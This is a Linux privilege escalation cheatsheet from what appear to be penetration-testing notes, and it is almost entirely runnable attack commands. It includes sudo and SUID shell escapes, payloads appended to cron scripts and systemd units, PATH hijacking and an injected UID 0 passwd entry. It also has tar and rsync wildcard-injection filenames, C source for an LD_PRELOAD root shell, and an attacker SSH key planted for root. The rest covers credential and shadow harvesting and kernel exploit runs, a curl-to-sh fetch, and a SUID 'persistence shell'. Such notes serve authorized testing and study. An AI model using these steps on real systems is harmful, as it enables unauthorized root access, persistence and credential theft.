---
tags:
  - hack-notes
  - privesc
---

# Linux Privilege Escalation Cheatsheet

## Table of Contents

- [Initial Enumeration](#initial-enumeration)
- [Automated Enumeration Tools](#automated-enumeration-tools)
- [Sudo Abuse and GTFOBins](#sudo-abuse-and-gtfobins)
- [SUID and SGID Binaries](#suid-and-sgid-binaries)
- [Linux Capabilities](#linux-capabilities)
- [Cron Jobs and Writable Scripts](#cron-jobs-and-writable-scripts)
- [Writable PATH Hijacking](#writable-path-hijacking)
- [Writable /etc/passwd and /etc/shadow](#writable-etcpasswd-and-etcshadow)
- [NFS no_root_squash](#nfs-no_root_squash)
- [Docker and LXD Group](#docker-and-lxd-group)
- [Wildcard Injection](#wildcard-injection)
- [LD_PRELOAD and LD_LIBRARY_PATH](#ld_preload-and-ld_library_path)
- [Systemd and Timer Abuse](#systemd-and-timer-abuse)
- [SSH Key Hunting](#ssh-key-hunting)
- [Password Reuse and Credential Hunting](#password-reuse-and-credential-hunting)
- [Kernel Exploits](#kernel-exploits)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## Initial Enumeration

bash

```bash
id                                  # Current user, groups, and UID/GID
whoami                              # Current username
sudo -l                            # List sudo rights for current user
uname -a                           # Kernel version and architecture
cat /etc/os-release                # Distribution and version
cat /etc/issue                     # OS banner
hostname                           # System hostname
arch                               # Machine hardware name
```

### System and Process Context

bash

```bash
ps aux                             # All running processes with owners
ps -ef --forest                    # Process tree view
cat /etc/passwd                    # Enumerate local user accounts
cat /etc/group                     # Enumerate groups and membership
ls -la /home                       # Inspect home directories
env                                # Environment variables (look for secrets)
history                            # Current shell command history
cat ~/.bash_history                # Stored bash history
```

### Network and Services

bash

```bash
ip a                               # List interfaces and addresses
ss -tulpn                          # Listening TCP/UDP sockets with processes
netstat -tulpn                     # Same, on older systems
cat /etc/hosts                     # Static host entries
arp -a                             # ARP cache for nearby hosts
```

### Filesystem and Mounts

bash

```bash
mount                              # Mounted filesystems and options
cat /etc/fstab                     # Configured mounts (may hold creds)
df -h                              # Disk usage and mount points
lsblk                              # Block devices
find / -writable -type d 2>/dev/null   # World writable directories
```

---

## Automated Enumeration Tools

bash

```bash
./linpeas.sh                       # Run LinPEAS local enumeration
./linpeas.sh -a                    # Run all checks including slow ones
./linpeas.sh | tee linpeas.txt     # Run and save output to a file
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh   # Run without writing to disk
```

### LinEnum

bash

```bash
./LinEnum.sh                       # Standard enumeration sweep
./LinEnum.sh -t                    # Thorough tests
./LinEnum.sh -k password           # Keyword search across readable files
./LinEnum.sh -r report -e /tmp/    # Write report and export findings
```

### pspy Process Monitoring

bash

```bash
./pspy64                           # Watch processes and cron without root
./pspy64 -pf                       # Print commands and file events
./pspy64 -i 1000                   # Poll interval in milliseconds
```

### Other Helpers

bash

```bash
./lse.sh -l1                       # linux-smart-enumeration, level 1 detail
sudo -l 2>/dev/null                # Quick sudo capability check
./linux-exploit-suggester.sh       # Map kernel version to known exploits
getcap -r / 2>/dev/null            # Capability sweep across filesystem
```

---

## Sudo Abuse and GTFOBins

bash

```bash
sudo -l                            # List allowed sudo commands
sudo -l -U username                # List sudo rights for another user
sudo su -                          # Become root if full sudo allowed
sudo /bin/bash                     # Spawn root shell directly
```

### Shell Escapes via Allowed Binaries

bash

```bash
sudo vim -c ':!/bin/sh'            # Escape to shell from vim
sudo less /etc/profile             # Then type !/bin/sh inside less
sudo find . -exec /bin/sh \; -quit # find spawns a shell
sudo awk 'BEGIN {system("/bin/sh")}'   # awk shell escape
sudo nmap --interactive            # Old nmap interactive mode then !sh
sudo python -c 'import os; os.system("/bin/sh")'   # python shell
sudo perl -e 'exec "/bin/sh";'     # perl shell escape
sudo env /bin/sh                   # env runs a shell
```

### LD_PRESERVE and env_keep

bash

```bash
sudo -l                            # Check for env_keep+=LD_PRELOAD
sudo LD_PRELOAD=/tmp/evil.so program   # Inject library when env preserved
```

> GTFOBins at https://gtfobins.github.io lists shell, file read, file write,
> and SUID escape techniques for hundreds of binaries.

---

## SUID and SGID Binaries

bash

```bash
find / -perm -4000 -type f 2>/dev/null         # All SUID binaries
find / -perm -2000 -type f 2>/dev/null         # All SGID binaries
find / -perm -6000 -type f 2>/dev/null         # SUID and SGID set
find / -perm -u=s -type f 2>/dev/null          # SUID, symbolic form
find / -perm -4000 -ls 2>/dev/null             # SUID with details
```

### Exploiting SUID Binaries

bash

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit      # SUID find spawns root shell
cp /bin/bash /tmp/bash; chmod +s /tmp/bash     # If you can set SUID bit
/tmp/bash -p                                    # Run SUID bash, keep privileges
nano                                            # SUID nano can read/write any file
```

> Cross reference every SUID binary against GTFOBins under the "SUID" function.
> The `-p` flag on bash preserves the effective UID instead of dropping it.

---

## Linux Capabilities

bash

```bash
getcap -r / 2>/dev/null            # Recursively list file capabilities
getcap /usr/bin/python3            # Check a specific binary
```

### Exploiting Capabilities

bash

```bash
# cap_setuid on python
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'   # Set UID 0 then shell

# cap_setuid on perl
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'

# cap_dac_read_search lets you read any file
getcap /usr/bin/tar               # Confirm capability, then read protected files
```

> `cap_setuid` and `cap_setgid` give direct root. `cap_dac_read_search` and
> `cap_dac_override` bypass file permission checks.

---

## Cron Jobs and Writable Scripts

bash

```bash
cat /etc/crontab                   # System wide cron schedule
ls -la /etc/cron.d/                # Drop in cron jobs
ls -la /etc/cron.daily/            # Daily scripts
ls -la /etc/cron.hourly/           # Hourly scripts
crontab -l                         # Current user crontab
cat /var/spool/cron/crontabs/*     # Per user crontabs (root readable)
grep -rl "" /etc/cron* 2>/dev/null # List cron config files
```

### Abusing a Writable Cron Script

bash

```bash
ls -la /path/to/cron_script.sh     # Confirm write permission
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/cron_script.sh   # Append payload
# Wait for cron to fire, then:
/tmp/rootbash -p                   # Spawn SUID root shell
```

---

## Writable PATH Hijacking

bash

```bash
echo $PATH                         # Inspect the current PATH order
ls -la /tmp                        # Confirm a writable directory is early in PATH
```

### Hijacking a Relative Command in a Root Script

bash

```bash
# A root cron calls "backup" without an absolute path. PATH includes /tmp first.
cd /tmp                            # Move to writable dir
echo '#!/bin/bash' > backup        # Create the fake binary
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> backup
chmod +x backup                    # Make it executable
export PATH=/tmp:$PATH             # Ensure /tmp is searched first
# When the privileged process runs, /tmp/backup executes
```

---

## Writable /etc/passwd and /etc/shadow

bash

```bash
ls -la /etc/passwd                 # Check write permission on passwd
ls -la /etc/shadow                 # Check read or write on shadow
```

### Injecting a Root User into /etc/passwd

bash

```bash
openssl passwd -1 -salt hax pass123     # Generate a MD5 crypt hash
echo 'hacker:$1$hax$qJh...:0:0:root:/root:/bin/bash' >> /etc/passwd   # Add UID 0 user
su hacker                          # Switch to the new root account, password pass123
```

### Cracking a Readable /etc/shadow

bash

```bash
unshadow /etc/passwd /etc/shadow > unshadowed.txt   # Combine for John
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt   # Crack hashes
hashcat -m 1800 hashes.txt rockyou.txt              # Crack sha512crypt
```

---

## NFS no_root_squash

bash

```bash
cat /etc/exports                   # Local export config
showmount -e target_ip             # List exports from an attacker box
```

### Exploiting no_root_squash

bash

```bash
# On the attacker machine, as root:
mkdir /mnt/nfs                     # Local mount point
mount -o rw,vers=3 target_ip:/share /mnt/nfs   # Mount the writable share
cp /bin/bash /mnt/nfs/rootbash     # Copy bash into the share
chown root:root /mnt/nfs/rootbash  # Owned by root because no_root_squash
chmod +s /mnt/nfs/rootbash         # Set the SUID bit
# Back on the target as the low priv user:
/share/rootbash -p                 # Run the SUID root bash
```

---

## Docker and LXD Group

bash

```bash
id                                 # Confirm membership in docker or lxd
groups                             # List current groups
```

### Docker Group to Root

bash

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh   # Mount host root, chroot in
docker run -v /:/mnt --rm -it alpine sh -c 'cp /mnt/etc/passwd /tmp; echo done'   # Read host files
```

### LXD Group to Root

bash

```bash
lxc image import alpine.tar.gz --alias privesc        # Import a small image
lxc init privesc r00t -c security.privileged=true     # Privileged container
lxc config device add r00t host disk source=/ path=/mnt/root recursive=true   # Mount host /
lxc start r00t                                        # Start it
lxc exec r00t /bin/sh                                 # Shell with host root at /mnt/root
```

---

## Wildcard Injection

bash

```bash
ls -la                             # Look for filenames you can create in a job dir
```

### tar Wildcard Injection

bash

```bash
# A root cron runs: tar czf backup.tar.gz *
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh   # Payload script
echo "" > '--checkpoint=1'         # tar reads filenames as options
echo "" > '--checkpoint-action=exec=sh shell.sh'   # Runs shell.sh at checkpoint
# When tar runs with the wildcard, it executes the payload
```

### rsync and chown Wildcard Injection

bash

```bash
# A job runs: rsync -a * backup/
echo "" > '-e sh shell.sh'         # rsync treats the filename as -e remote shell
# A job runs: chown -R user *
ln -s /etc/shadow file.txt         # Symlink to redirect chown via --reference style abuse
```

---

## LD_PRELOAD and LD_LIBRARY_PATH

### LD_PRELOAD via Sudo

bash

```bash
sudo -l                            # Must show env_keep+=LD_PRELOAD
cat > /tmp/preload.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c   # Build the shared object
sudo LD_PRELOAD=/tmp/preload.so apache2   # Any sudo allowed binary triggers it
```

### LD_LIBRARY_PATH Hijacking

bash

```bash
ldd /usr/sbin/some_suid_binary     # Find which libraries it loads
# Build a malicious version of a loaded library name, then:
sudo LD_LIBRARY_PATH=/tmp some_binary   # Loads /tmp/libtarget.so first
```

---

## Systemd and Timer Abuse

bash

```bash
systemctl list-timers --all        # All systemd timers and next run
systemctl list-units --type=service   # Running services
find / -writable -name '*.service' 2>/dev/null   # Writable unit files
ls -la /etc/systemd/system/        # Service unit directory
```

### Hijacking a Writable Service Unit

bash

```bash
# If a root service unit file is writable:
nano /etc/systemd/system/vuln.service   # Edit ExecStart
# Set: ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
systemctl daemon-reload            # Reload unit definitions
systemctl restart vuln.service     # Trigger the payload
/tmp/rootbash -p                   # Use the SUID shell
```

---

## SSH Key Hunting

bash

```bash
find / -name 'id_rsa' 2>/dev/null          # Private keys anywhere
find / -name 'id_ed25519' 2>/dev/null      # Ed25519 private keys
find / -name 'authorized_keys' 2>/dev/null # Authorized key files
ls -la /home/*/.ssh/                       # Per user ssh directories
cat /home/user/.ssh/id_rsa                 # Read a discovered key
```

### Using a Found Key

bash

```bash
chmod 600 found_key                # Tighten permissions or ssh refuses it
ssh -i found_key user@target       # Authenticate with the private key
ssh2john id_rsa > keyhash          # Convert a passphrase protected key for John
john --wordlist=rockyou.txt keyhash   # Crack the passphrase
```

### Planting Your Own Key

bash

```bash
mkdir -p /root/.ssh                # If you can write to root home
echo 'ssh-ed25519 AAAA... attacker' >> /root/.ssh/authorized_keys   # Add your key
```

---

## Password Reuse and Credential Hunting

bash

```bash
grep -ri password /etc/ 2>/dev/null        # Configs holding passwords
grep -ri 'password' /var/www/ 2>/dev/null  # Web app credentials
find / -name '*.conf' 2>/dev/null | xargs grep -li pass 2>/dev/null   # Conf files
cat /var/www/html/wp-config.php            # WordPress DB creds example
cat ~/.mysql_history ~/.psql_history       # Database client history
cat ~/.bash_history ~/.zsh_history         # Shell history for typed secrets
```

### Trying Reused Passwords

bash

```bash
su root                            # Try a found password against root
su otheruser                       # And against other accounts
for u in $(cut -d: -f1 /etc/passwd); do echo "$u"; done   # List users to spray
```

---

## Kernel Exploits

bash

```bash
uname -r                           # Kernel release for matching exploits
cat /proc/version                  # Full kernel and compiler version
./linux-exploit-suggester.sh       # Suggest matching public exploits
searchsploit linux kernel 4.4      # Search Exploit-DB locally
```

### Dirty COW (CVE-2016-5195)

bash

```bash
gcc -pthread dirty.c -o dirty -lcrypt   # Compile the passwd variant
./dirty mypassword                      # Adds a root user firefart
su firefart                             # Switch with the chosen password
```

### Dirty Pipe (CVE-2022-0847)

bash

```bash
gcc dirtypipe.c -o dirtypipe       # Affects kernels 5.8 to 5.16.x
./dirtypipe /etc/passwd 1 oothi:   # Overwrite a root account password field
./dirtypipe                        # SUID hijack variant on a chosen binary
```

### PwnKit polkit (CVE-2021-4034)

bash

```bash
gcc cve-2021-4034.c -o pwnkit      # Local pkexec privilege escalation
./pwnkit                           # Spawns a root shell, no auth needed
pkexec --version                   # Confirm pkexec is present and vulnerable
```

### Sudo Baron Samedit (CVE-2021-3156)

bash

```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')   # Crash test for vulnerability
gcc exploit.c -o samedit           # Heap overflow in sudo before 1.9.5p2
./samedit                          # Root shell on vulnerable sudo
sudo --version                     # Check version against the patch
```

---

## Common Workflows

### Workflow: Enumerate, Find Vector, Escalate

bash

```bash
# Step 1: quick manual triage
id; sudo -l; uname -a              # Who am I, sudo rights, kernel

# Step 2: automated sweep
./linpeas.sh | tee linpeas.txt     # Full enumeration, saved

# Step 3: hunt the obvious wins
find / -perm -4000 -type f 2>/dev/null     # SUID binaries
getcap -r / 2>/dev/null                    # Capabilities
cat /etc/crontab                           # Scheduled jobs

# Step 4: confirm and exploit the chosen vector
# (sudo escape, SUID GTFOBin, cron hijack, etc.)

# Step 5: confirm root and stabilize
id                                 # Expect uid=0
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash   # Persistence shell
```

### Workflow: Background Process Discovery

bash

```bash
./pspy64 -pf -i 1000               # Watch for root cron and timer activity
# Note any script paths, then check write access:
find / -writable -not -path '/proc/*' 2>/dev/null | grep -E '\.sh$'   # Writable scripts
```

### Workflow: Credential Pivot

bash

```bash
grep -ri password /etc /var/www /home 2>/dev/null   # Harvest secrets
cat ~/.bash_history ~/.ssh/id_rsa 2>/dev/null       # History and keys
su root                            # Try password reuse first, it is free
```

---

## Quick Reference

bash

```bash
id; sudo -l; uname -a                          # Fast triage trio
./linpeas.sh                                   # Automated enumeration
find / -perm -4000 -type f 2>/dev/null         # SUID hunt
find / -perm -2000 -type f 2>/dev/null         # SGID hunt
getcap -r / 2>/dev/null                        # Capability hunt
cat /etc/crontab                               # Cron review
./pspy64 -pf                                    # Watch processes
showmount -e target_ip                         # NFS exports
docker run -v /:/mnt --rm -it alpine chroot /mnt sh   # Docker group escape
gcc -fPIC -shared -nostartfiles -o p.so p.c    # Build LD_PRELOAD object
unshadow /etc/passwd /etc/shadow > out.txt     # Prep shadow for cracking
find / -name id_rsa 2>/dev/null                # SSH key hunt
./linux-exploit-suggester.sh                   # Kernel exploit matcher
```

### Reference Sites

bash

```bash
# https://gtfobins.github.io          Binary escape techniques
# https://github.com/peass-ng/PEASS-ng LinPEAS and winPEAS
# https://github.com/DominicBreuker/pspy pspy process monitor
# https://book.hacktricks.xyz          HackTricks privilege escalation
```

---

## Related

- Checklists: [Assumed Breach](../Checklists/Assumed%20Breach.md), [Kubernetes and Containers](../Checklists/Kubernetes%20and%20Containers.md)
- [Reverse Shells and File Transfer](Reverse%20Shells%20and%20File%20Transfer.md)
- [Pivoting and Tunneling](Pivoting%20and%20Tunneling.md)
- [Windows Privilege Escalation](Windows%20Privilege%20Escalation.md)
- [Kubernetes and Container Breakout](Kubernetes%20and%20Container%20Breakout.md)
